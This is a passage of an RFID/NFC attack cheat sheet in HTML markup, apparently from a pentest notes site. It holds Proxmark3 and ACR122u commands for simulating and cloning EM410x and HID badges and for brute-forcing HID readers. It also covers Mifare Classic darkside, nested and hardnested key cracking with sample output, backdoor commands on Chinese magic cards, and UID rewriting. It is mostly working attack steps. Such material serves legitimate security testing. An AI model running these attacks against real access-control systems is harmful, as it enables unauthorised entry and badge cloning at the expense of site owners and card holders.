<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">Proxmark</span><span class="p">&gt;</span> <span class="n">lf</span> <span class="n">em4x</span> <span class="n">em410xsim</span> <span class="n">23004d4dee</span>
</code></pre></div>
<h2 id="hid-example-card">HID : Example - Card</h2>
<h3 id="hid-card-format">HID card format</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">lf</span> <span class="n">hid</span> <span class="n">decode</span> <span class="n">10001fc656</span>
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="p">--------------------------------------------------</span>          
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>       <span class="n">Format</span><span class="p">:</span> <span class="n">H10302</span> <span class="p">(</span><span class="n">HID</span> <span class="n">H10302</span> <span class="n">37-bit</span> <span class="n">huge</span> <span class="n">ID</span><span class="p">)</span>          
<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>  <span class="n">Card</span> <span class="n">Number</span><span class="p">:</span> <span class="n">1041195</span>          
<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>       <span class="n">Parity</span><span class="p">:</span> <span class="n">Valid</span>          
<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="p">--------------------------------------------------</span>          
<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>       <span class="n">Format</span><span class="p">:</span> <span class="n">H10304</span> <span class="p">(</span><span class="n">HID</span> <span class="n">H10304</span> <span class="n">37-bit</span><span class="p">)</span>          
<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="n">Facility</span> <span class="n">Code</span><span class="p">:</span> <span class="n">1</span>          
<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>  <span class="n">Card</span> <span class="n">Number</span><span class="p">:</span> <span class="n">516907</span>          
<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>       <span class="n">Parity</span><span class="p">:</span> <span class="n">Valid</span>          
<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="p">--------------------------------------------------</span> 
</code></pre></div>
<h3 id="write-an-hid-card">Write an HID card</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c"># version with facility code is better</span>
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">lf</span> <span class="n">hid</span> <span class="n">encode</span> <span class="n">H10304</span> <span class="n">f</span> <span class="n">49153</span> <span class="n">c</span> <span class="n">516907</span>
<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">HID</span> <span class="n">Prox</span> <span class="n">TAG</span> <span class="n">ID</span><span class="p">:</span> <span class="n">1c001fc656</span>         
<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">lf</span> <span class="n">hid</span> <span class="n">encode</span> <span class="n">H10302</span> <span class="n">c</span> <span class="n">1041195</span>
<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="n">HID</span> <span class="n">Prox</span> <span class="n">TAG</span> <span class="n">ID</span><span class="p">:</span> <span class="n">10001fc656</span>          
<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="p">-------------------------------------------------</span>
</code></pre></div>
<p>Example 2</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">lf</span> <span class="n">hid</span> <span class="n">decode</span> <span class="n">1c0006bb43</span>
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="p">--------------------------------------------------</span>          
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>       <span class="n">Format</span><span class="p">:</span> <span class="n">H10302</span> <span class="p">(</span><span class="n">HID</span> <span class="n">H10302</span> <span class="n">37-bit</span> <span class="n">huge</span> <span class="n">ID</span><span class="p">)</span>          
<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>  <span class="n">Card</span> <span class="n">Number</span><span class="p">:</span> <span class="n">220577</span>          
<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>       <span class="n">Parity</span><span class="p">:</span> <span class="n">Valid</span>          
<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="p">--------------------------------------------------</span>          
<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>       <span class="n">Format</span><span class="p">:</span> <span class="n">H10304</span> <span class="p">(</span><span class="n">HID</span> <span class="n">H10304</span> <span class="n">37-bit</span><span class="p">)</span>          
<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="n">Facility</span> <span class="n">Code</span><span class="p">:</span> <span class="n">49152</span>          
<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>  <span class="n">Card</span> <span class="n">Number</span><span class="p">:</span> <span class="n">220577</span>          
<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>       <span class="n">Parity</span><span class="p">:</span> <span class="n">Valid</span>          
<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="p">--------------------------------------------------</span>          
<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">lf</span> <span class="n">hid</span> <span class="n">encode</span> <span class="n">H10302</span> <span class="n">c</span> <span class="n">220577</span>
<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="n">HID</span> <span class="n">Prox</span> <span class="n">TAG</span> <span class="n">ID</span><span class="p">:</span> <span class="n">100006bb43</span>  
</code></pre></div>
<h3 id="bruteforce-an-hid-reader">Bruteforce an HID reader</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">pm3</span> <span class="p">--&gt;</span> <span class="n">lf</span> <span class="n">hid</span> <span class="n">brute</span> <span class="n">a</span> <span class="n">26</span> <span class="n">f</span> <span class="n">224</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">pm3</span> <span class="p">--&gt;</span> <span class="n">lf</span> <span class="n">hid</span> <span class="n">brute</span> <span class="n">v</span> <span class="n">a</span> <span class="n">26</span> <span class="n">f</span> <span class="n">21</span> <span class="n">c</span> <span class="n">200</span> <span class="n">d</span> <span class="n">2000</span>
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">Options</span>
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="p">---</span>
<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="n">a</span> <span class="p">&lt;</span><span class="n">format</span><span class="p">&gt;</span>        <span class="p">:</span>  <span class="n">26</span><span class="p">|</span><span class="n">33</span><span class="p">|</span><span class="n">34</span><span class="p">|</span><span class="n">35</span><span class="p">|</span><span class="n">37</span><span class="p">|</span><span class="n">40</span><span class="p">|</span><span class="n">44</span><span class="p">|</span><span class="n">84</span>
<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="n">f</span> <span class="p">&lt;</span><span class="n">facility-code</span><span class="p">&gt;</span> <span class="p">:</span>  <span class="n">8-bit</span> <span class="n">value</span> <span class="n">HID</span> <span class="n">facility</span> <span class="n">code</span>
<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="n">c</span> <span class="p">&lt;</span><span class="n">cardnumber</span><span class="p">&gt;</span>    <span class="p">:</span>  <span class="p">(</span><span class="n">optional</span><span class="p">)</span> <span class="n">cardnumber</span> <span class="n">to</span> <span class="nb">start </span><span class="n">with</span><span class="p">,</span> <span class="n">max</span> <span class="n">65535</span>
<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="n">d</span> <span class="p">&lt;</span><span class="n">delay</span><span class="p">&gt;</span>         <span class="p">:</span>  <span class="n">delay</span> <span class="n">betweens</span> <span class="n">attempts</span> <span class="k">in</span> <span class="n">ms</span><span class="p">.</span> <span class="k">Default</span> <span class="n">1000ms</span>
<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="n">v</span>                 <span class="p">:</span>  <span class="n">verbose</span> <span class="n">logging</span><span class="p">,</span> <span class="n">show</span> <span class="n">all</span> <span class="n">tries</span>
</code></pre></div>
<h2 id="hf-mifare-desfire">HF - Mifare DESFire</h2>
<blockquote>
<p>No known attacks yet ! Unencrypted sectors can be read, also you can try to look for default keys. All MIFARE cards are prone to relay attack.</p>
</blockquote>
<ul>
<li>
<p>Mifare DESFire <a href="https://arstechnica.com/information-technology/2011/10/researchers-hack-crypto-on-rfid-smart-cards-used-for-keyless-entry-and-transit-pass/">MF3ICD40</a>: uses Triple DES encryption, product discontinued.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">It</span> <span class="n">requires</span> <span class="n">the</span> <span class="n">attacker</span> <span class="n">to</span> <span class="n">have</span> <span class="n">the</span> <span class="n">card</span> <span class="n">itself</span><span class="p">,</span> <span class="n">an</span> <span class="n">RFID</span> <span class="n">reader</span><span class="p">,</span> <span class="n">and</span> <span class="n">a</span> <span class="n">radio</span> <span class="n">probe</span><span class="p">.</span> 
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="n">Using</span> <span class="n">differential</span> <span class="n">power</span> <span class="n">analysis</span><span class="p">,</span> <span class="n">data</span> <span class="n">is</span> <span class="n">collected</span> <span class="n">from</span> <span class="n">radio</span> <span class="n">frequency</span> <span class="n">energy</span> 
<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="n">that</span> <span class="n">leaks</span> <span class="n">out</span> <span class="n">of</span> <span class="n">the</span> <span class="n">card</span> <span class="p">(</span><span class="n">its</span> <span class="err">“</span><span class="n">side</span> <span class="n">channels</span><span class="err">”</span><span class="p">).</span>
</code></pre></div>
* Mifare DESFire EV1 : the challenge is done with AES or 3DES.
* Mifare DESFire EV2</p>
</li>
</ul>
<h2 id="hf-mifare-ultra-light">HF - Mifare Ultra Light</h2>
<ul>
<li>Ultralight C (3DES authentication)</li>
<li>Ultralight EV1</li>
<li>NTAG2</li>
</ul>
<h3 id="chinese-backdoor">Chinese backdoor</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">pm3</span> <span class="p">--&gt;</span> <span class="n">hf</span> <span class="n">14a</span> <span class="n">raw</span> <span class="n">-p</span> <span class="n">-b</span> <span class="n">7</span> <span class="n">40</span>
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">pm3</span> <span class="p">--&gt;</span> <span class="n">hf</span> <span class="n">14a</span> <span class="n">raw</span> <span class="n">-p</span> <span class="n">43</span>
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="n">pm3</span> <span class="p">--&gt;</span> <span class="n">hf</span> <span class="n">14a</span> <span class="n">raw</span> <span class="n">-p</span> <span class="n">-c</span> <span class="n">a20059982120</span>
<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="n">0x40</span><span class="p">,</span> <span class="n">init</span> <span class="n">backdoor</span> <span class="n">mode</span>
<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="n">0x41</span><span class="p">,</span> <span class="n">wipe</span> <span class="n">fills</span> <span class="n">card</span> <span class="n">with</span> <span class="n">0xFF</span>
<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="n">0x42</span><span class="p">,</span> <span class="n">fills</span> <span class="n">card</span> <span class="n">with</span> <span class="n">0x00</span>
<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="n">0x43</span><span class="p">,</span> <span class="n">no</span> <span class="n">authentication</span> <span class="n">needed</span><span class="p">.</span>  <span class="n">issue</span> <span class="n">a</span> <span class="n">0x3000</span> <span class="n">to</span> <span class="n">read</span> <span class="n">block</span> <span class="n">0</span><span class="p">,</span> <span class="n">or</span> <span class="nb">write </span><span class="n">block</span><span class="p">.</span>
<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="n">0x44</span><span class="p">,</span> <span class="n">fills</span> <span class="n">card</span> <span class="n">with</span> <span class="n">0x55</span>
</code></pre></div>
<h3 id="simulate">Simulate</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">hf</span> <span class="n">14a</span> <span class="n">sim</span> <span class="n">2</span> <span class="p">&lt;</span><span class="n">7-byte</span> <span class="n">tag</span><span class="p">&gt;</span>
</code></pre></div>
<h2 id="hf-mifare-classic-1k">HF - Mifare Classic 1k</h2>
<p>New method for Proxmark : <code>hf mf autopwn</code></p>
<h3 id="darkside-attack-prng-weak">Darkside attack (PRNG Weak)</h3>
<p><strong>Proxmark method</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">pm3</span><span class="p">&gt;</span> <span class="n">hf</span> <span class="n">search</span>
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="n">pm3</span><span class="p">&gt;</span> <span class="n">hf</span> <span class="n">mfu</span>
<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="n">pm3</span><span class="p">&gt;</span> <span class="n">hf</span> <span class="n">mf</span> <span class="n">darkside</span>  <span class="p">(</span><span class="n">fork</span> <span class="n">command</span><span class="p">)</span>
<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="n">pm3</span><span class="p">&gt;</span> <span class="n">hf</span> <span class="n">mf</span> <span class="n">mifare</span>    <span class="p">(</span><span class="n">original</span> <span class="n">command</span><span class="p">)</span>
<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="n">Parity</span> <span class="n">is</span> <span class="n">all</span> <span class="n">zero</span><span class="p">.</span> <span class="n">Most</span> <span class="n">likely</span> <span class="n">this</span> <span class="n">card</span> <span class="n">sends</span> <span class="n">NACK</span> <span class="n">on</span> <span class="n">every</span> <span class="n">failed</span> <span class="n">authentication</span><span class="p">.</span> <span class="c"># Card is empty...</span>
<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="n">or</span>
<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="n">Found</span> <span class="n">valid</span> <span class="n">key</span><span class="p">:</span><span class="n">ffffffffffff</span> <span class="c"># KEY_FOUND</span>
<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>
<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="n">pm3</span><span class="p">&gt;</span> <span class="n">hf</span> <span class="n">mf</span> <span class="n">chk</span> <span class="n">0</span> <span class="n">A</span> <span class="n">KEY_FOUND</span>    <span class="p">(</span><span class="n">Check</span> <span class="n">Found</span> <span class="n">Key</span> <span class="n">On</span> <span class="n">Block</span> <span class="n">0</span> <span class="n">A</span><span class="p">)</span>
</code></pre></div>
<p><strong>ACR122u method</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c"># start cracking the first key of the first sector. </span>
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">mfcuk</span> <span class="n">-C</span> <span class="n">-R</span> <span class="n">0</span><span class="p">:</span><span class="n">A</span> <span class="n">-v</span> <span class="n">3</span> <span class="n">-s</span> <span class="n">250</span> <span class="n">-S</span> <span class="n">250</span>
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="n">mfcuk</span> <span class="n">-C</span> <span class="n">-R</span> <span class="n">3</span><span class="p">:</span><span class="n">A</span> <span class="n">-v</span> <span class="n">3</span> <span class="n">-s</span> <span class="n">250</span> <span class="n">-S</span> <span class="n">250</span> <span class="n">-o</span> <span class="n">mycard</span><span class="p">.</span><span class="n">mfc</span>
</code></pre></div>
<h3 id="nested-attack-prng-weak">Nested attack (PRNG Weak)</h3>
<blockquote>
<p>Need to find a default key to extract the others</p>
</blockquote>
<p><strong>Proxmark method</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">hf</span> <span class="n">search</span>
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">chk</span> <span class="n">1</span> <span class="p">?</span> <span class="n">t</span>                      <span class="c"># &quot;Test Block Keys&quot; command which will test the default keys for us</span>
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">nested</span> <span class="n">1</span> <span class="n">0</span> <span class="n">A</span> <span class="n">a0a1a2a3a4a5</span> <span class="n">t</span><span class="p">.</span>   <span class="c"># &quot;Nested Attack&quot; use the key a0a1a2a3a4a5, keeping the key in memory with &quot;t&quot;</span>
<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">chk</span> <span class="p">*</span> <span class="p">?</span>                        <span class="c"># &quot;Test Block Keys&quot; command which will test the default keys for us</span>
<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">nested</span> <span class="n">1</span> <span class="n">0</span> <span class="n">A</span> <span class="n">ffffffffffff</span>   <span class="n">d</span>  <span class="c"># &quot;Nested Attack&quot; use the key ffffffffffff to extract the others (file:dumpkeys.bin)</span>
<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">dump</span> <span class="n">1</span>                         <span class="c"># Dump content</span>
<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">restore</span> <span class="n">1</span>                      <span class="c"># Restore content into the card</span>
<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">wrbl</span> <span class="n">5</span> <span class="n">A</span> <span class="n">080808080808</span> <span class="n">32110000cdeeffff3211000005fa05fa</span>  <span class="c"># write on block 5, with the key 0808... the content 3211...</span>
<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">rdbl</span> <span class="n">5</span> <span class="n">A</span> <span class="n">080808080808</span>          <span class="c"># Read block 5 with the keu 0808..</span>
<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>
<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>
<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="n">python</span> <span class="n">pm3_mfd2eml</span><span class="p">.</span><span class="n">py</span> <span class="n">dumpdata</span><span class="p">.</span><span class="n">bin</span> <span class="n">dumpdata</span><span class="p">.</span><span class="n">eml</span>
<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="n">pm3</span><span class="p">&gt;</span> <span class="n">hf</span> <span class="n">mf</span> <span class="n">cload</span> <span class="n">dumpdata</span>
</code></pre></div>
<p><strong>ACR122u method</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">nfc-list</span>
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="n">mfoc</span> <span class="n">-O</span> <span class="n">card</span><span class="p">.</span><span class="n">mfd</span> <span class="c"># dump the memory of the tag</span>
<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="c"># Le paramètre P permet de spécifier le nombre de sondes par secteur. Par défaut, ce nombre est à 20 mais nous pouvons le passer à 500.</span>
<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="n">mfoc</span> <span class="n">-P</span> <span class="n">500</span> <span class="n">-O</span> <span class="n">dump_first_try</span><span class="p">.</span><span class="n">dmp</span>
<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="n">nfc-mfclassic</span> <span class="n">w</span> <span class="n">a</span> <span class="n">key</span><span class="p">.</span><span class="n">mfd</span> <span class="n">data</span><span class="p">.</span><span class="n">mfd</span> <span class="c"># write data</span>
<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="n">nfc-mfclassic</span> <span class="n">W</span> <span class="n">a</span> <span class="n">key</span><span class="p">.</span><span class="n">mfd</span> <span class="n">data</span><span class="p">.</span><span class="n">mfd</span> <span class="c"># write data and sector 0</span>
</code></pre></div>
<h3 id="hardnested-attack">Hardnested attack</h3>
<blockquote>
<p>One key is needed in order to use this attack</p>
</blockquote>
<p>For newest MIFARE Classic and MIFARE Plus SL1</p>
<p><strong>Proxmark method</strong></p>
<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> NOTE: These hardware changes resulted in the Proxmark 3 Easy being incapable of performing several of the Proxmark's advanced features, including the Mifare Hard-Nested attacks. In other word you need a real Proxmark, not a cheap chinese copy.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c"># find a default key</span>
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="c"># res column is either equal to 1 or 0. </span>
<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="c"># A 1 in the column means the key was valid for that sector.</span>
<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">chk</span> <span class="p">*</span><span class="n">1</span> <span class="p">?</span> <span class="n">t</span>
<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>
<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="c"># &lt;block number&gt; &lt;key A|B&gt; &lt;key (12 hex symbols)&gt;</span>
<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="c"># &lt;target block number&gt; &lt;target key A|B&gt; [known target key (12 hex symbols)] [w] [s]</span>
<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="c"># w: Acquire nonces and write them to binary file nonces.bin</span>
<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">hardnested</span> <span class="n">0</span> <span class="n">A</span> <span class="n">8829da9daf76</span> <span class="n">4</span> <span class="n">A</span> <span class="n">w</span>
<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>
<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="c"># then https://github.com/aczid/crypto1_bs</span>
<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="p">./</span><span class="n">solve_piwi</span> <span class="n">0xcafec0de</span><span class="p">.</span><span class="n">bin</span>
<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a><span class="p">./</span><span class="n">solve_piwi_bs</span> <span class="n">0xcafec0de</span><span class="p">.</span><span class="n">bin</span>
</code></pre></div>
<p><strong>ACR122u method</strong></p>
<p>With the key n°A a0a1a2a3a4a5 for sector 0 and we want key n°A for sector 1. This method can be reused for every sectors.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="p">./</span><span class="n">libnfc_crypto1_crack</span> <span class="n">a0a1a2a3a4a5</span> <span class="n">0</span> <span class="n">a</span> <span class="n">4</span> <span class="n">a</span>
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">Found</span> <span class="n">tag</span> <span class="n">with</span> <span class="n">uid</span> <span class="n">62ef9e5a</span><span class="p">,</span> <span class="n">collecting</span> <span class="n">nonces</span> <span class="k">for</span> <span class="n">key</span> <span class="n">A</span> <span class="n">of</span> <span class="n">block</span> <span class="n">4</span> <span class="p">(</span><span class="n">sector</span> <span class="n">1</span><span class="p">)</span> <span class="n">using</span> <span class="n">known</span> <span class="n">key</span> <span class="n">A</span> <span class="n">a0a1a2a3a4a5</span> <span class="k">for</span> <span class="n">block</span> <span class="n">0</span> <span class="p">(</span><span class="n">sector</span> <span class="n">0</span><span class="p">)</span>
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="n">Collected</span> <span class="n">2379</span> <span class="n">nonces</span><span class="p">...</span> <span class="n">leftover</span> <span class="n">complexity</span> <span class="n">23833993588</span> <span class="p">(~</span><span class="n">2</span><span class="p">^</span><span class="n">34</span><span class="p">.</span><span class="n">47</span><span class="p">)</span> <span class="p">-</span> <span class="n">initializing</span> <span class="n">brute-force</span> <span class="n">phase</span><span class="p">...</span>
<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="n">Starting</span> <span class="n">4</span> <span class="n">threads</span> <span class="n">to</span> <span class="n">test</span> <span class="n">23833993588</span> <span class="n">states</span> <span class="n">using</span> <span class="n">256-way</span> <span class="n">bitslicing</span>
<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="n">Cracking</span><span class="p">...</span>  <span class="n">88</span><span class="p">.</span><span class="n">93</span><span class="p">%</span>
<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="n">Found</span> <span class="n">key</span><span class="p">:</span> <span class="n">c44e2b5e4ce3</span>
<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="n">Tested</span> <span class="n">21232975852</span> <span class="n">states</span>
</code></pre></div>
<h3 id="magic-chinese-card-acronyms">Magic Chinese Card - Acronyms</h3>
<p><strong>UID</strong> - The original Chinese Magic Backdoor card. These cards respond to the backdoor commands and will show Chinese magic backdoor commands (GEN 1a) detected when you do an hf search. These cards can be detected by probing the card to see if it responds to the backdoor commands. Some RFID systems may try to detect these cards.</p>
<p><strong>CUID</strong> - The 2nd generation Chinese Magic Backdoor card. These cards do not use the backdoor commands, but instead allow Block 0 to be written to like any other block on the card. This gives the card better compatibility to be written to from an Android phone. However, some RFID systems can detect this type of card by sending a write command to Block 0, making the card invalid after the first use is attempted.</p>
<p><strong>FUID</strong> - This type of card is not as common, but allows Block 0 to be written to just once. This allows you to create a clone of a card and any checks done by the RFID system will pass because Block 0 is no longer writable.</p>
<p><strong>UFUID</strong> - This type of card is apparently a "better" version of the FUID card. Instead of only allowing Block 0 to be written once, you can write to it many times and then lock the block later when you're happy with the result. After locking Block 0, it cannot be unlocked to my knowledge. I do not think there is currently a way to lock these cards using the Proxmark3.</p>
<h3 id="magic-chinese-card-gen-2">Magic Chinese Card - GEN 2</h3>
<p>They can be copied directly. The software allows a new UID.</p>
<h3 id="magic-chinese-card-gen-1a">Magic Chinese Card - GEN 1a</h3>
<blockquote>
<p><strong>Works better on the official client.py instead of the iceman fork.</strong></p>
</blockquote>
<p>Reset a UID Changeable Magic Card (7 bytes UID) <img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> You should prefer this method !</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">hf</span> <span class="n">mf</span> <span class="n">csetuid</span> <span class="n">42917CAB</span> <span class="n">0004</span> <span class="n">08</span>
<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="n">uid</span><span class="p">:</span><span class="n">42</span> <span class="n">91</span> <span class="n">7c</span> <span class="n">ab</span>           
